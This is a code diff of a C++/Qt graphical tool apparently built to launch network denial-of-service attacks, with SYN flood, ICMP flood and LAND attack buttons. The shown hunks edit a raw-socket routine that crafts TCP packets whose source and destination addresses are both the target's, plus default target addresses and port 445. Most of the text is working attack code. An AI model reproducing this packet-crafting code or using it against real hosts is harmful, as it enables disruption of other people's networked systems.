@@ -58,7 +58,7 @@ int attack::doland()
     struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
     struct pseudohdr pseudoheader;
 
-    fprintf(stderr,"land.c by m3lt, FLC\n");
+    fprintf(stderr,"land attack...\n");
 
     bzero(&sin,sizeof(struct sockaddr_in));
     sin.sin_family=AF_INET;
@@ -90,6 +90,7 @@ int attack::doland()
     ipheader->id=htons(0xF1C);
     ipheader->ttl=255;
     ipheader->protocol=IPPROTO_TCP;//IP_TCP;
+
     ipheader->saddr=sin.sin_addr.s_addr;
     ipheader->daddr=sin.sin_addr.s_addr;
 
@@ -111,12 +112,14 @@ int attack::doland()
     QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +" land attack...\n";
     appendOutput(qmsg);
 
+//    while(true)
+//    {
     if(sendto(sockfd,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
     {
             fprintf(stderr,"couldn't send packet\n");
             return(-1);
     }
-
+//    }
 //    fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);
 
     ::close(sockfd);
@@ -170,11 +173,13 @@ void attack::initWidget()
     m_textResult->setFixedSize(680,320);
 
     m_inputIp = new QLineEdit();
-    m_inputIp->setText("172.16.113.56");
-    m_inputIp->setFixedSize(100, 24);
+//    m_inputIp->setText("172.16.113.56");
+//    m_inputIp->setText("192.168.20.151");
+    m_inputIp->setText("192.168.199.146");
+    m_inputIp->setFixedSize(150, 24);
 
     m_inputPort = new QLineEdit();
-    m_inputPort->setText("6666");
+    m_inputPort->setText("445");//("102");//("6666");
     m_inputPort->setFixedSize(100, 24);
 
 
@@ -291,7 +296,7 @@ void attack::land()
     {
         m_buttonSYN->setEnabled(true);
         m_buttonICMP->setEnabled(true);
-        m_buttonLAND->setText("ICMP Flood攻击");
+        m_buttonLAND->setText("LAND攻击");
 
   //      psyn->sig_int(0);
         appendOutput("攻击已停止");
